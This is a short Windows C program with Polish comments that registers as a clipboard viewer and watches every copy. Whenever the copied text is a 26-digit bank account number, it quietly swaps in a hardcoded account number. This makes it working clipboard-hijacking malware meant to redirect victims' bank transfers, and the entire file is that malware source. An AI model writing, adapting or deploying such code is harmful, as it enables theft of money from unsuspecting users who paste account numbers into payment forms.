// ConsoleApplication1.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <stdio.h>
#include <Windows.h>
#include <ctype.h>

int digits_only(const char* s)
{
    while (*s) {
        if (isdigit(*s++) == 0) return 0;
    }

    return 1;
}

long FAR PASCAL
WndProc(HWND hwnd, WORD message, WORD wParam, LONG lParam)
{
    HDC hdc;
    PAINTSTRUCT ps;
    RECT rect;
  
    static HWND hwndNxtVwr;
    switch (message)
    {
    case WM_CREATE:
        printf("z");
        hwndNxtVwr = SetClipboardViewer(hwnd);
        return 0;
    case WM_DRAWCLIPBOARD:
        OpenClipboard(hwnd);
        if (IsClipboardFormatAvailable(CF_TEXT)) {
            HANDLE clipboardData = GetClipboardData(CF_TEXT);
            void * hProgMem = GlobalAlloc(GHND, GlobalSize(clipboardData));
            char* clipboardText = (char*)GlobalLock(clipboardData);
            char* lpProgMem = GlobalLock(hProgMem);


            OutputDebugStringA(clipboardText);
            lstrcpy(lpProgMem, clipboardText);
            if(strlen(lpProgMem)==strlen("49102028922276300500000000") && digits_only(lpProgMem))
                lstrcpy(lpProgMem, "49102028922276300500000000");


            EmptyClipboard();
            SetClipboardData(CF_TEXT, lpProgMem);

            GlobalUnlock(hProgMem);
            GlobalUnlock(clipboardData);
           
        }
        CloseClipboard();

        if (hwndNxtVwr != NULL)
            /* jesli nie jestem ostatni w lancuchu to musze powiadomic nastepny CbV */
        {
            SendMessage(hwndNxtVwr, message, wParam, lParam);
        }



       
        return 0;
    case WM_DESTROY:
        ChangeClipboardChain(hwnd, hwndNxtVwr);
        PostQuitMessage(0); 
        return 0;
    default:
        return DefWindowProc(hwnd, message, wParam, lParam);
    }
}

int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpszCmdLine, int nCmdShow)
{
    MSG msg;
    BOOL bRet;
    WNDCLASS wc;
    UNREFERENCED_PARAMETER(lpszCmdLine);


    if (!hPrevInstance)
    {
        wc.style = 0;
        wc.lpfnWndProc = (WNDPROC)WndProc;
        wc.cbClsExtra = 0;
        wc.cbWndExtra = 0;
        wc.hInstance = hInstance;
        wc.hIcon = LoadIcon((HINSTANCE)NULL,
            IDI_APPLICATION);
        wc.hCursor = LoadCursor((HINSTANCE)NULL,
            IDC_ARROW);
        wc.hbrBackground = GetStockObject(WHITE_BRUSH);
        wc.lpszMenuName = "MainMenu";
        wc.lpszClassName = "MainWndClass";

        if (!RegisterClass(&wc))
            return FALSE;
    }

    HINSTANCE hinst = hInstance;  

    HWND hwndMain = CreateWindow("MainWndClass", "Sample",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
        CW_USEDEFAULT, CW_USEDEFAULT, (HWND)NULL,
        (HMENU)NULL, hinst, (LPVOID)NULL);


    if (!hwndMain)
        return FALSE;

    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
    {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
    }

    return msg.wParam;
}